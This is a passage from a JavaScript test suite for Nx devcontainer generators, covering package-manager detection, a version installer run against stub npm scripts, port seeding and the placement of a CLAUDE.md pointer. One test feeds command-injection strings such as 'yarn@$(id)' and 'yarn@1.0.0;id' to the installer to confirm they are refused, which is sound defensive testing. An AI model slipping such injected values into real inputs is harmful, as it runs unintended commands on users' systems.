  ok((b.dc.forwardPorts ?? []).length === 0, `the UI is disabled, so no emulator port is forwarded: ${JSON.stringify(b.dc.forwardPorts)}`);
  writeJson(custom, 'firebase.json', { emulators: { auth: { port: 19099 }, firestore: { port: 18080, websocketPort: 19150 }, ui: { port: 14000 }, logging: { port: 14500 }, singleProjectMode: true } });
  const c = await artifacts(custom, [...registry.detectLayers(custom), 'agent']);
  ok(JSON.stringify(c.dc.forwardPorts) === '[14000,19099,18080,19150,14500]', `firebase.json's own ports, for the UI: ${JSON.stringify(c.dc.forwardPorts)}`);
});

// A6 — the package-manager rule is rendered into post-create from the one table, and behaves like the TS rule.
checkAsync('post-create detects the package manager with the generators\' own rule (rendered, not copied)', async (ok) => {
  const { detectPackageManager } = require_(join(BUILD, 'src/generators/_utils/package-manager'));
  const a = await artifacts(createTreeWithEmptyWorkspace(), ['nx', 'agent', 'node']);
  const start = a.post.indexOf('if [ -f "$WS/package.json" ]; then');
  const block = a.post.slice(start, a.post.indexOf('\nfi\n', start) + 4).replace(/^\s*\$PM_INSTALL\s*$/m, '').replace(/^\s*sh "\$WS\/\.devcontainer\/house\.package-manager\.sh".*$/m, '');
  ok(start >= 0 && !block.includes('{{'), 'the node-install piece rendered its detection');
  const cases = [
    [{ packageManager: 'pnpm@9.0.0' }, ['yarn.lock']],
    [{ packageManager: 'npm@10.0.0' }, []],
    [{}, ['pnpm-lock.yaml', 'yarn.lock']],
    [{}, ['package-lock.json']],
    [{}, []],
  ];
  for (const [pkg, locks] of cases) {
    const dir = mkdtempSync(join(tmpdir(), 'pm-'));
    writeFileSync(join(dir, 'package.json'), JSON.stringify({ name: 'x', ...pkg }, null, 2));
    for (const lock of locks) writeFileSync(join(dir, lock), '');
    const shell = execFileSync('bash', ['-c', `WS="$1"; ${block} printf %s "$PM"`, '_', dir], { encoding: 'utf8' }).split('\n').pop();
    const tree = createTreeWithEmptyWorkspace();
    writeJson(tree, 'package.json', { name: 'x', ...pkg });
    for (const lock of locks) tree.write(lock, '');
    const ts = detectPackageManager(tree);
    ok(shell === ts, `${JSON.stringify(pkg)} + ${locks.join(',') || 'no lockfile'}: post-create says ${shell}, the generators ${ts}`);
    rmSync(dir, { recursive: true, force: true });
  }
});

// The container must HAVE the project's package manager: the image decides what exists, and post-create's install runs
// under `set -e`. The derivation is one rule in two languages, so they are run against each other; the installer is RUN
// against a fake npm and fake package managers, since what it installs is the behaviour worth pinning.
const PM_SPEC_CASES = [
  ['exact', { packageManager: 'yarn@1.22.22' }, {}, 'yarn@1.22.22'],
  ['corepack hash stripped', { packageManager: 'pnpm@9.1.0+sha512.abc' }, {}, 'pnpm@9.1.0'],
  ['a line', { packageManager: 'yarn@4' }, {}, 'yarn@4'],
  ['a range is no version: installing it would float', { packageManager: 'pnpm@^9.0.0' }, {}, 'pnpm'],
  ['a tag is no version', { packageManager: 'yarn@latest' }, {}, 'yarn'],
  ['yarnPath hands over, whatever is declared', { packageManager: 'yarn@4.5.0' }, { '.yarnrc.yml': 'nodeLinker: node-modules\nyarnPath: .yarn/releases/yarn.cjs\n' }, 'yarn'],
  ["yarn 1's yarn-path hands over too", {}, { '.yarnrc': 'yarn-path ".yarn/yarn.js"\n', 'yarn.lock': '' }, 'yarn'],
  ['yarn-path with a colon hands over', { packageManager: 'yarn@4.5.0' }, { '.yarnrc': 'yarn-path: .yarn/yarn.js\n' }, 'yarn'],
  ['a quoted yarnPath hands over', { packageManager: 'yarn@4.5.0' }, { '.yarnrc.yml': '"yarnPath": .yarn/yarn.cjs\n' }, 'yarn'],
  ["a single-quoted yarnPath hands over", { packageManager: 'yarn@4.5.0' }, { '.yarnrc.yml': "'yarnPath': .yarn/yarn.cjs\n" }, 'yarn'],
  ['a spaced yarnPath hands over', { packageManager: 'yarn@4.5.0' }, { '.yarnrc.yml': 'yarnPath : .yarn/yarn.cjs\n' }, 'yarn'],
  ['a tab after the key still hands over', { packageManager: 'yarn@4.5.0' }, { '.yarnrc.yml': 'yarnPath:\t.yarn/yarn.cjs\n' }, 'yarn'],
  ['an empty yarnPath hands over to nothing', { packageManager: 'yarn@4.5.0' }, { '.yarnrc.yml': 'yarnPath:\nnodeLinker: node-modules\n' }, 'yarn@4.5.0'],
  ['a yarnPath that is only a comment hands over to nothing', { packageManager: 'yarn@4.5.0' }, { '.yarnrc.yml': 'yarnPath: # none\n' }, 'yarn@4.5.0'],
  ['a commented-out yarnPath hands over to nothing', { packageManager: 'yarn@4.5.0' }, { '.yarnrc.yml': '# yarnPath: x\n' }, 'yarn@4.5.0'],
  ['a number with letters in it is no version', { packageManager: 'pnpm@10-a.b.c' }, {}, 'pnpm'],
  ['a prerelease of an exact version is one', { packageManager: 'yarn@4.0.0-rc.1' }, {}, 'yarn@4.0.0-rc.1'],
  ['undeclared, classic lockfile', {}, { 'yarn.lock': '# yarn lockfile v1\n' }, 'yarn'],
  ['undeclared, berry lockfile', {}, { 'yarn.lock': '__metadata:\n  version: 8\n' }, 'yarn@berry'],
  ['undeclared, berry config', {}, { '.yarnrc.yml': 'nodeLinker: node-modules\n' }, 'yarn@berry'],
  ['undeclared pnpm', {}, { 'pnpm-lock.yaml': '' }, 'pnpm'],
  ['undeclared npm', {}, { 'package-lock.json': '' }, 'npm'],
  ['nothing at all: the house default', {}, {}, 'yarn'],
  ['npm, exact', { packageManager: 'npm@10.9.0' }, {}, 'npm@10.9.0'],
];
// Written by hand: JSON.stringify would never give the generator or post-create a manifest this shape.
const PM_SPEC_RAW_MANIFESTS = [
  ['minified, a nested declaration after the real one', '{"name":"x","packageManager":"yarn@1.22.22","x":{"packageManager":"pnpm@9.0.0"}}', 'yarn@1.22.22'],
  ['no declaration at all, under pipefail', '{"name":"x"}', 'yarn'],
];

checkAsync('package manager: the spec the image build gets and the one post-create derives are the same rule', async (ok) => {
  const { packageManagerSpec, packageManagerShellDetection } = require_(join(BUILD, 'src/generators/_utils/package-manager'));
  const detect = packageManagerShellDetection();
  ok(packageManagerSpec(wrapperRepo()) === undefined, 'a repo with no package.json has no package manager to provide');
  for (const [label, pkg, files, expected] of PM_SPEC_CASES) {
    const dir = mkdtempSync(join(tmpdir(), 'pm-spec-'));
    writeFileSync(join(dir, 'package.json'), JSON.stringify({ name: 'x', ...pkg }, null, 2));
    const tree = createTreeWithEmptyWorkspace();
    writeJson(tree, 'package.json', { name: 'x', ...pkg });
    for (const [file, text] of Object.entries(files)) {
      writeFileSync(join(dir, file), text);
      tree.write(file, text);
    }
    const shell = execFileSync('bash', ['-c', `set -euo pipefail\nWS="$1"\n${detect}\nprintf %s "$PM_SPEC"`, '_', dir], { encoding: 'utf8' });
    const ts = packageManagerSpec(tree);
    ok(shell === expected, `${label}: post-create derives ${shell}, expected ${expected}`);
    ok(ts === expected, `${label}: the generator derives ${ts}, expected ${expected}`);
    rmSync(dir, { recursive: true, force: true });
  }
  for (const [label, manifest, expected] of PM_SPEC_RAW_MANIFESTS) {
    const dir = mkdtempSync(join(tmpdir(), 'pm-spec-'));
    writeFileSync(join(dir, 'package.json'), manifest);
    const tree = createTreeWithEmptyWorkspace();
    tree.write('package.json', manifest);
    const shell = execFileSync('bash', ['-c', `set -euo pipefail\nWS="$1"\n${detect}\nprintf %s "$PM_SPEC"`, '_', dir], { encoding: 'utf8' });
    ok(shell === expected, `${label}: post-create derives ${shell}, expected ${expected}`);
    ok(packageManagerSpec(tree) === expected, `${label}: the generator derives ${packageManagerSpec(tree)}, expected ${expected}`);
    rmSync(dir, { recursive: true, force: true });
  }
});

/** A package manager at a version, as a script answering `--version` the way the real one does. */
const fakePm = (dir, name, version) => {
  mkdirSync(dir, { recursive: true });
  writeFileSync(join(dir, name), `#!/bin/sh\n[ "$1" = --version ] && echo ${version}\n`, { mode: 0o755 });
};
/**
 * The installer against a PATH holding only what it is given and the tools it uses. The fake npm logs, and an install
 * lays down the package's binary in its prefix: `--prefix <dir>` if given, else the "global" dir (which `npmFails` refuses).
 */
const runPmInstaller = (script, spec, { on = {}, behind = {}, shadow, npm = true, npmFails = false, npmLandsAhead = false } = {}) => {
  const dir = mkdtempSync(join(tmpdir(), 'pm-install-'));
  const home = join(dir, 'home');
  const global = join(dir, 'global');
  const tools = join(dir, 'tools');
  const log = join(dir, 'npm.log');
  mkdirSync(join(home, '.local/bin'), { recursive: true });
  mkdirSync(global);
  mkdirSync(tools);
  for (const tool of ['awk', 'head', 'tr', 'id', 'sh', 'mkdir', 'chmod']) symlinkSync(execFileSync('sh', ['-c', `command -v ${tool}`], { encoding: 'utf8' }).trim(), join(tools, tool));
  const { npm: npmVersion = '11.0.0', ...others } = on;
  for (const [name, version] of Object.entries(others)) fakePm(global, name, version);
  // The image's own copy, BEHIND the prefix an install lands in (/usr/local/bin vs npm-global/bin on typescript-node).
  for (const [name, version] of Object.entries(behind)) fakePm(tools, name, version);
  const npmVersionFile = join(dir, 'npm.version');
  writeFileSync(npmVersionFile, `${npmVersion}\n`);
  if (shadow) fakePm(join(home, '.local/bin'), ...shadow);
  if (npm) {
    writeFileSync(join(tools, 'npm'), `#!/bin/sh
if [ "$1" = --version ]; then read -r line < '${npmVersionFile}'; echo "$line"; exit 0; fi
echo "$*" >> '${log}'
prefix=''
force=''
while [ $# -gt 0 ]; do
  case "$1" in
    --prefix) prefix="$2"; shift ;;
    --force) force=1 ;;
    -*|install) ;;
    *) package="$1" ;;
  esac
  shift
done
if [ -z "$prefix" ] && [ ${npmFails ? 1 : 0} = 1 ]; then echo EACCES >&2; exit 243; fi
into="\${prefix:+$prefix/bin}"; into="\${into:-${global}}"
version="\${package##*@}"; name="\${package%@*}"
case "$name" in @yarnpkg/cli-dist) name=yarn ;; npm) [ ${npmLandsAhead ? 1 : 0} = 1 ] || { echo "$version" > '${npmVersionFile}'; exit 0; } ;; esac
mkdir -p "$into"
# The real npm's refusal when another package holds the bin name in the prefix (seen swapping yarn for @yarnpkg/cli-dist).
if [ -e "$into/$name" ] && [ -z "$force" ]; then echo EEXIST >&2; exit 1; fi
printf '#!/bin/sh\\n[ "$1" = --version ] && echo %s\\n' "$version" > "$into/$name"; chmod +x "$into/$name"
`, { mode: 0o755 });
  }
  const file = join(dir, 'house.package-manager.sh');
  writeFileSync(file, script);
  // ~/.local/bin first and the global prefix after it, as in a house container.
  const env = { PATH: `${join(home, '.local/bin')}:${global}:${tools}`, HOME: home };
  let status = 0;
  let output = '';
  const shell = execFileSync('sh', ['-c', 'command -v sh'], { encoding: 'utf8' }).trim();
  try {
    output = execFileSync(shell, ['-c', 'sh "$0" "$1" 2>&1', file, spec], { env, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] });
  } catch (error) {
    status = error.status;
    output = `${error.stdout}${error.stderr}`;
  }
  const calls = existsSync(log) ? readFileSync(log, 'utf8').trim().split('\n') : [];
  const inLocal = readdirSync(join(home, '.local/bin'));
  rmSync(dir, { recursive: true, force: true });
  return { status, calls, output, inLocal };
};

check('package manager: the installer installs only what is not already right, and never floats', (ok) => {
  const { renderPackageManagerScript } = require_(join(BUILD, 'src/generators/devcontainer/compose'));
  const { PACKAGE_MANAGER_PINS } = require_(join(BUILD, 'src/generators/_utils/versions'));
  const script = renderPackageManagerScript();
  ok(shParses(script) && !script.includes('{{'), 'the rendered script does not parse, or kept a placeholder');
  ok(script.includes('Generated by @bespunky/nx-tools:devcontainer'), 'no provenance line: the next run would take it for the project\'s own');
  for (const [pm, versions] of Object.entries(PACKAGE_MANAGER_PINS)) {
    for (const version of versions) ok(/^\d+\.\d+\.\d+$/.test(version), `the pin ${pm} ${version} is not exact`);
  }
  const berry = PACKAGE_MANAGER_PINS.yarn.find((version) => !version.startsWith('1.'));
  const classic = PACKAGE_MANAGER_PINS.yarn[0];
  const pnpm = PACKAGE_MANAGER_PINS.pnpm[0];
  const run = (...args) => runPmInstaller(script, ...args);
  const quiet = (label, result) => ok(result.status === 0 && result.calls.length === 0, `${label}: expected no install, got ${JSON.stringify(result)}`);
  const installs = (label, result, package_) =>
    ok(result.status === 0 && result.calls.length === 1 && result.calls[0].endsWith(` ${package_}`) && result.calls[0].includes('-g'), `${label}: expected one global install of ${package_}, got ${JSON.stringify(result)}`);

  // Already right: nothing happens, whichever way the project asked.
  quiet('exact, present', run('yarn@1.22.22', { on: { yarn: '1.22.22' } }));
  quiet('no version, any present', run('yarn', { on: { yarn: '1.22.19' } }));
  quiet('a line, within it', run('yarn@4', { on: { yarn: '4.5.0' } }));
  quiet('a major.minor line, within it', run('pnpm@9.1', { on: { pnpm: '9.1.4' } }));
  quiet('berry, on berry', run('yarn@berry', { on: { yarn: '3.8.0' } }));
  quiet('npm, no version', run('npm', { on: { npm: '11.0.0' } }));

  // Missing (typescript-node:26's yarn, pnpm on an image with none).
  installs('exact, missing', run('yarn@1.22.22'), 'yarn@1.22.22');
  installs('no version, missing: the pin', run('yarn'), `yarn@${classic}`);
  installs('pnpm, no version, missing: the pin', run('pnpm'), `pnpm@${pnpm}`);
  installs('pnpm, exact, missing', run('pnpm@9.15.9'), 'pnpm@9.15.9');
  installs('a line, missing: the pin of that line', run('yarn@4'), `@yarnpkg/cli-dist@${berry}`);

  // Wrong version: yarn@4 with no yarnPath on an image with yarn 1 — yarn 2+ is a different npm package.
  installs('yarn 4 over yarn 1', run('yarn@4.5.0', { on: { yarn: '1.22.22' } }), '@yarnpkg/cli-dist@4.5.0');
  installs('yarn 1 over another yarn 1', run('yarn@1.22.22', { on: { yarn: '1.22.19' } }), 'yarn@1.22.22');
  installs('berry evidence on yarn 1: the berry pin', run('yarn@berry', { on: { yarn: '1.22.22' } }), `@yarnpkg/cli-dist@${berry}`);
  installs('npm, exact, wrong', run('npm@10.9.0', { on: { npm: '11.0.0' } }), 'npm@10.9.0');
  // A line is compared by its dots: 10.34.9 is not within 10.3, and the pin is not either, so nothing fits.
  ok(run('pnpm@10.3', { on: { pnpm: '10.34.9' } }).status === 1, 'a line was compared as a string prefix');

  // Refused, having said why, with nothing installed.
  const noPin = run('pnpm@7', { on: { pnpm: '10.0.0' } });
  ok(noPin.status === 1 && noPin.calls.length === 0 && noPin.output.includes('Declare an exact one'), `a line the house has no pin of must not float: ${JSON.stringify(noPin)}`);
  const noNpm = run('pnpm@9.15.9', { npm: false });
  ok(noNpm.status === 1 && noNpm.output.includes('has no npm'), `an image with no npm is named: ${JSON.stringify(noNpm)}`);
  for (const hostile of ['yarn@1.0.0;id', 'yarn@$(id)', 'yarn@-g', 'bun@1.0.0', '']) {
    const refused = run(hostile);
    ok(refused.status === 1 && refused.calls.length === 0, `'${hostile}' reached npm: ${JSON.stringify(refused)}`);
  }

  // The install lands EARLIER on PATH than the image's copy (/usr/local/bin vs npm-global/bin on typescript-node): the check
  // after it must see the new one. npm too, where the script's shell remembers the old one: found with the real npm.
  installs('an image copy behind the prefix', run('yarn@4.5.0', { behind: { yarn: '1.22.22' } }), '@yarnpkg/cli-dist@4.5.0');
  installs('npm, landing ahead of the image\'s npm', run('npm@10.9.0', { npmLandsAhead: true }), 'npm@10.9.0');

  // A prefix this user cannot write (a foreign image's root-owned /usr/local): ~/.local, first on the house's PATH.
  const fallback = run('yarn@1.22.22', { npmFails: true });
  ok(fallback.status === 0 && fallback.calls.length === 2 && fallback.calls[1].includes('--prefix') && fallback.inLocal.includes('yarn'), `no fallback to ~/.local: ${JSON.stringify(fallback)}`);
  // An earlier fallback's copy shadows a good global install: the version check after the install is what notices.
  const shadowed = run('yarn@1.22.22', { shadow: ['yarn', '1.22.19'] });
  ok(shadowed.status === 0 && shadowed.calls.length === 2 && shadowed.calls[1].includes('--prefix'), `a shadowed install was reported as done: ${JSON.stringify(shadowed)}`);
});

checkAsync('package manager: the image layer states what package.json declares; every image source gets the script; post-create survives an image without it', async (ok) => {
  const nodeRepo = (pkg = {}) => {
    const tree = createTreeWithEmptyWorkspace();
    writeJson(tree, 'package.json', { name: 'shop', ...pkg });
    return tree;
  };
  const script = (tree) => tree.read('.devcontainer/house.package-manager.sh', 'utf8');
  const layers = ['nx', 'agent', 'node'];

  const tree = nodeRepo({ packageManager: 'pnpm@9.15.9' });
  const a = await artifacts(tree, layers);
  ok(a.dockerfile.includes("house.package-manager.sh 'pnpm@9.15.9'"), `the image layer does not state the declared version:\n${a.dockerfile}`);
  ok(a.dockerfile.includes('COPY house.package-manager.sh /tmp/') && !/\{\{/.test(a.dockerfile), 'the script is not copied from the build context, or a placeholder survived');
  ok(a.dockerfile.indexOf('house.packages.sh') < a.dockerfile.indexOf('house.package-manager.sh'), 'the package manager layer comes after the OS packages');
  ok(a.dc.build?.context === '.', 'the build context moved: package.json is deliberately not in it');
  ok(a.post.includes('.devcontainer/house.package-manager.sh" "$PM_SPEC"') && a.post.indexOf('house.package-manager.sh') < a.post.indexOf('$PM_INSTALL\n'), 'post-create does not provide the package manager before it installs');
  ok(script(tree)?.includes('HOUSE_PINS'), 'the script was not written');
  ok(bashParses(a.post), 'post-create.sh does not parse');
  ok((await artifacts(nodeRepo({ packageManager: 'yarn@4.5.0' }), layers)).dockerfile.includes("'yarn@4.5.0'"), 'the spec is not the project\'s');
  ok((await artifacts(nodeRepo({ packageManager: 'yarn@latest' }), layers)).dockerfile.includes("house.package-manager.sh 'yarn'"), 'a tag reached the image layer');

  // No layer asks: no script, no layer; a house-written script left by an earlier run goes with the layer.
  const wrapper = wrapperRepo();
  const w = await artifacts(wrapper, ['nx', 'agent']);
  ok(!w.dockerfile.includes('package-manager') && !wrapper.exists('.devcontainer/house.package-manager.sh'), 'a repo with no package.json got a package manager layer');
  const left = nodeRepo();
  await artifacts(left, layers);
  await artifacts(left, ['nx', 'agent']);
  ok(!left.exists('.devcontainer/house.package-manager.sh'), 'the script outlived the layer that asked for it');

  // An adopted devcontainer with an image of its own: no Dockerfile, the same script, post-create runs it.
  const foreign = nodeRepo({ packageManager: 'yarn@1.22.22' });
  foreign.write('.devcontainer/devcontainer.json', '{ "image": "node:26", "remoteUser": "node" }\n');
  const f = await artifacts(foreign, layers);
  ok(!foreign.exists('.devcontainer/house.Dockerfile') && script(foreign)?.includes('HOUSE_PINS'), 'a foreign image is not covered by the script');
  ok(f.post.includes('house.package-manager.sh" "$PM_SPEC"'), 'an adopted post-create does not provide the package manager');
  // ... and a script at that path the house did not write stays the project's.
  const theirs = nodeRepo();
  theirs.write('.devcontainer/house.package-manager.sh', '#!/bin/sh\necho ours\n');
  await artifacts(theirs, layers);
  ok(script(theirs) === '#!/bin/sh\necho ours\n', 'a project file at the house path was overwritten');

  // THE BUG: the rendered piece, under post-create's own `set -euo pipefail`, on an image with no yarn. A fake npm provides it.
  const dir = mkdtempSync(join(tmpdir(), 'pm-post-create-'));
  const bin = join(dir, 'bin');
  const ws = join(dir, 'ws');
  const log = join(dir, 'yarn.log');
  mkdirSync(join(ws, '.devcontainer'), { recursive: true });
  mkdirSync(bin);
  writeFileSync(join(ws, 'package.json'), JSON.stringify({ name: 'x', packageManager: 'yarn@1.22.22' }, null, 2));
  writeFileSync(join(ws, '.devcontainer/house.package-manager.sh'), script(tree));
  writeFileSync(join(bin, 'npm'), `#!/bin/sh\nprintf '#!/bin/sh\\n[ "$1" = --version ] && echo 1.22.22 || echo "yarn $*" >> "${log}"\\n' > '${bin}/yarn'; chmod +x '${bin}/yarn'\n`, { mode: 0o755 });
  const start = a.post.indexOf('if [ -f "$WS/package.json" ]; then');
  const piece = a.post.slice(start, a.post.indexOf('\nfi\n', start) + 4);
  const output = execFileSync('bash', ['-c', `set -euo pipefail\nexec < /dev/null\nWS="$1"\ncd "$WS"\n${piece}`, '_', ws], { env: { PATH: `${bin}:/usr/bin:/bin`, HOME: dir }, encoding: 'utf8' });
  ok(readFileSync(log, 'utf8').trim() === 'yarn install --non-interactive', `post-create did not install with the yarn it provided:\n${output}`);
  rmSync(dir, { recursive: true, force: true });
});

// A6 — the dev-server base port is the owning stack's; a dev-server nobody can place is reported, not guessed.
checkAsync('dev seeding: the base port is the stack\'s; an unowned dev-server without a port is reported, not declared on a guess', async (ok) => {
  const { seedFromAdapters } = require_(join(BUILD, 'src/generators/dev/fragments'));
  const tree = FIXTURES['angular web app with firebase and a design system']();
  addProjectConfiguration(tree, 'firebase', { root: 'firebase', targets: { emulators: { executor: 'nx:run-commands', options: { command: 'true' } } } });
  const report = seedFromAdapters(tree, 'shop');
  const decl = JSON.parse(tree.read('.bespunky/dev.json', 'utf8'));
  ok(decl.apps.shop.processes.find((p) => p.id === 'app')?.ports.app === registry.layer('angular').devcontainer.ports[0].port, `angular base port: ${JSON.stringify(decl.apps.shop)}`);
  ok(report.some((l) => l.includes('"emulators"')), `the Firebase capability's fragment still seeds beside it: ${report.join(' | ')}`);
  const vite = createTreeWithEmptyWorkspace();
  addProjectConfiguration(vite, 'site', { root: 'apps/site', targets: { 'dev-server': { executor: '@nx/vite:dev-server' } } });
  const said = seedFromAdapters(vite, 'site');
  ok(!vite.exists('.bespunky/dev.json'), 'declared a guessed base port');
  ok(said.some((l) => l.includes('base port is unknown')), `not reported: ${said.join(' | ')}`);
});

// A9 — no import cycle in the payload's own modules (the layer registry and the adapter registry once were one).
check('the payload has no import cycle between the layer and adapter registries', (ok) => {
  const files = [];
  const walk = (d) => readdirSync(d, { withFileTypes: true }).forEach((e) => (e.isDirectory() ? walk(join(d, e.name)) : e.name.endsWith('.js') && files.push(join(d, e.name))));
  walk(join(BUILD, 'src/layers'));
  walk(join(BUILD, 'src/adapters'));
  const edges = (f) =>
    [...readFileSync(f, 'utf8').matchAll(/require\(["'](\.[^"']+)["']\)/g)]
      .map((m) => resolve(dirname(f), m[1]))
      .map((r) => (existsSync(`${r}.js`) ? `${r}.js` : existsSync(join(r, 'index.js')) ? join(r, 'index.js') : null))
      .filter(Boolean);
  const reaches = (from, target, seen = new Set()) =>
    edges(from).some((n) => n === target || (!seen.has(n) && seen.add(n) && existsSync(n) && reaches(n, target, seen)));
  const adapters = join(BUILD, 'src/adapters/registry.js');
  const layers = join(BUILD, 'src/layers/registry.js');
  ok(!(reaches(adapters, layers) && reaches(layers, adapters)), 'layers/registry and adapters/registry import each other');
});

// R4 — the house pointer never lands inside another tool's managed block (Nx's `nx configure-ai-agents` rewrites
// its block wholesale, and took the `@HOUSE.rules.md` import with it).
checkAsync('house-doc: the CLAUDE.md pointer goes outside Nx\'s managed block — and moves out of it if an older sync put it there', async (ok) => {
  const NX_BLOCK = '<!-- nx configuration start-->\n<!-- Leave the start & end comments to automatically receive updates. -->\n\n# General Guidelines for working with Nx\n\n## Running tasks\n\nUse nx.\n\n<!-- nx configuration end-->\n';
  const outside = (claude) => {
    const at = claude.indexOf('<!-- @bespunky/house-tooling:start');
    return at !== -1 && (at < claude.indexOf('<!-- nx configuration start-->') || at > claude.indexOf('<!-- nx configuration end-->'));
  };
  const cnw = createTreeWithEmptyWorkspace();
  cnw.write('CLAUDE.md', NX_BLOCK);
  await generator('house-doc')(cnw, { layers: ['nx', 'node'] });
  const first = cnw.read('CLAUDE.md', 'utf8');
  ok(outside(first), `the pointer was placed inside Nx's block:\n${first}`);
  ok(first.includes('@HOUSE.rules.md') && first.includes(NX_BLOCK.trim()), 'Nx block intact, import present');
  await generator('house-doc')(cnw, { layers: ['nx', 'node'] });
  ok(cnw.read('CLAUDE.md', 'utf8') === first, 'a second run moved the pointer again');
  // A project whose earlier sync put it inside the block: it moves out, once, and Nx's block is left as Nx wrote it.
  const old = createTreeWithEmptyWorkspace();
  const pointer = first.slice(first.indexOf('<!-- @bespunky/house-tooling:start'), first.indexOf('<!-- @bespunky/house-tooling:end -->') + '<!-- @bespunky/house-tooling:end -->'.length);
  old.write('CLAUDE.md', `# Mine\n\n${NX_BLOCK.replace('## Running tasks', `${pointer}\n\n## Running tasks`)}\n## My rules\n`);
  await generator('house-doc')(old, { layers: ['nx', 'node'] });
  const moved = old.read('CLAUDE.md', 'utf8');
  ok(outside(moved) && moved.split('<!-- @bespunky/house-tooling:start').length === 2, `not moved out exactly once:\n${moved}`);
  ok(moved.includes(NX_BLOCK.trim()), `Nx's block was not restored to what Nx wrote:\n${moved}`);
});

// D1/D2/D6/D11 — the house docs only promise what this shape has.
checkAsync('house docs: Firebase serve advice follows the real serve command; Angular-only DS and 4200 text only with Angular', async (ok) => {
  const lines = (text, re) => text.split('\n').filter((l) => re.test(l)).map((l) => l.slice(0, 140));
  // node + firebase, no web: nothing tells the agent to serve an app.
  const core = FIXTURES['plain npm repo wearing firebase and a neutral design system']();
  const a = await artifacts(core, [...registry.detectLayers(core), 'agent']);
  ok(lines(a.rules, /serve <app>|--no-emulators|--skip=emulators/).length === 0, `rules advise serving with no web layer: ${lines(a.rules, /serve <app>/)}`);
  ok(a.rules.includes('run firebase:emulators'), 'rules: the suite runs on its own');
  // design system without Angular: the neutral runtime, no Angular API or Angular-adapter generator.
  ok(lines(a.house, /DsTheme|DsRuntimeTheme|nx-tools:ds-component|:host/).length === 0, `Angular DS docs without angular: ${lines(a.house, /DsTheme|DsRuntimeTheme|nx-tools:ds-component|:host/)}`);
  ok(a.house.includes('setMode('), 'the neutral mode runtime is documented');
  // node + web (declaration only) + firebase: the engine's flags, no emulator promise, no 4200.
  const decl = FIXTURES['plain npm repo wearing firebase and a neutral design system']();
  writeJson(decl, '.bespunky/dev.json', { apps: { site: { processes: [{ id: 'app', cmd: 'node server.js', ports: { app: 3000 } }] } } });
  const b = await artifacts(decl, [...registry.detectLayers(decl), 'agent']);
  const both = `${b.house}\n${b.rules}`;
  ok(lines(both, /--no-emulators|nx serve|4200|--configuration/).length === 0, `Nx-face flags / 4200 in a declaration-only repo: ${lines(both, /--no-emulators|nx serve|4200|--configuration/)}`);
  ok(lines(b.house, /boots the emulator suite/).length === 0, `promises a suite the dev generator never seeds: ${lines(b.house, /boots the emulator suite/)}`);
  ok(b.rules.includes('tools/dev/dev serve <app>') && b.rules.includes('`--skip=emulators`'), 'rules use the engine command and flag');
  ok(!/arrow-key/.test(b.house) && !/slug, layers, and URLs/.test(b.house), 'picker / dry-run claims match the engine');
});

for (const run of pending) await run();

// ── workspace shape: layouts, linking, and what a TS-solution workspace is evidence of ────────────────────────
// Layouts and linking (docs/features/2026-10-02-workspace-layouts/) moved three things out of bash and into the
// package, and each is a place where a TS-solution workspace used to be invisible: which apps a sync refreshes
// (`cli.js apps`, which replaced an `apps/*` glob), what the SessionStart hook's evaluator reads (workspace members'
// package.json, not just project.json), and when the js layer is present (an inferred @nx/js/typescript library
// declares no @nx/js executor). And the scaffolder validates --layout / --linking against the projection alone.
console.log('\nworkspace shape (layouts, linking, TS-solution evidence)');
const tsSolution = () => {
  const tree = createTreeWithEmptyWorkspace();
  tree.delete('tsconfig.base.json');
  writeJson(tree, 'tsconfig.base.json', { compilerOptions: { composite: true, declaration: true, customConditions: ['@acme/source'] } });
  writeJson(tree, 'tsconfig.json', { extends: './tsconfig.base.json', files: [], references: [] });
  writeJson(tree, 'package.json', { name: '@acme/source', workspaces: ['packages/*'], devDependencies: { nx: '23.1.0' } });
  tree.write('package-lock.json', '{}');
  const nxJson = JSON.parse(tree.read('nx.json', 'utf8'));
  writeJson(tree, 'nx.json', { ...nxJson, plugins: [{ plugin: '@nx/js/typescript', options: {} }] });
  return tree;
};
const shellEvident = (dir) => execFileSync('bash', ['-c', '. "$1"; house_layers_evident "$2"', '_', PROJECTION, dir]).toString().trim();

check('projection: --layout / --linking ids, the default apps dir and each layout\'s apps dir come from the package', (ok) => {
  const { LAYOUTS, DEFAULT_LAYOUT } = require_(join(BUILD, 'src/generators/_utils/workspace-layout'));
  const out = execFileSync('bash', ['-c', `set -eu; . "$1"; printf '%s|%s|%s|%s' "$HOUSE_LAYOUTS" "$HOUSE_LAYOUT_DEFAULT_APPS_DIR" "$HOUSE_LINKINGS" "$HOUSE_LINKING_DEFAULT"; for l in $(printf '%s' "$HOUSE_LAYOUTS" | tr , ' '); do printf '|%s=%s' "$l" "$(house_layout_apps_dir "$l")"; [ -n "$(house_layout_title "$l")" ] || printf '(untitled)'; done; for k in $(printf '%s' "$HOUSE_LINKINGS" | tr , ' '); do [ -n "$(house_linking_title "$k")" ] || printf '|%s(untitled)' "$k"; done; printf '|bogus=%s' "$(house_layout_apps_dir bogus)"`, '_', PROJECTION]).toString();
  const want = `${Object.keys(LAYOUTS).join(',')}|${DEFAULT_LAYOUT.appsDir}|paths,workspaces|paths${Object.entries(LAYOUTS).map(([id, l]) => `|${id}=${l.appsDir}`).join('')}|bogus=`;
  ok(out === want, `got  ${out}\n         want ${want}`);
});

check('cli.js apps: layout- and linking-agnostic — a package.json-only app is found, a platform:server app is not', (ok) => {
  const tree = tsSolution();
  writeJson(tree, 'packages/web/package.json', { name: '@acme/web' }); // a TS-solution app: package.json + tsconfig.app.json
  writeJson(tree, 'packages/web/tsconfig.app.json', {});
  writeJson(tree, 'packages/ui/package.json', { name: '@acme/ui' }); // a library — not an app
  writeJson(tree, 'packages/ui/tsconfig.lib.json', {});
  addProjectConfiguration(tree, 'shop', { root: 'clients/shop', projectType: 'application', targets: { build: { executor: '@angular/build:application' } } });
  addProjectConfiguration(tree, 'functions', { root: 'clients/functions', projectType: 'application', tags: ['platform:server'], targets: {} });
  addProjectConfiguration(tree, 'shared-browser', { root: 'tools/shared-browser', tags: ['tooling'], targets: {} });
  const dir = flush(tree);
  try {
    const out = execFileSync(process.execPath, [join(BUILD, 'src/layers/cli.js'), 'apps'], { cwd: dir }).toString();
    ok(out === '@acme/web\tpackages/web\nshop\tclients/shop\n', `got ${JSON.stringify(out)}`);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

check('the worktree tab label is told the ENGINE\'s project identity, never the app\'s name or its own guess', (ok) => {
  // An upgrade runs in a linked worktree; the generator's fallback would read that worktree's directory name and
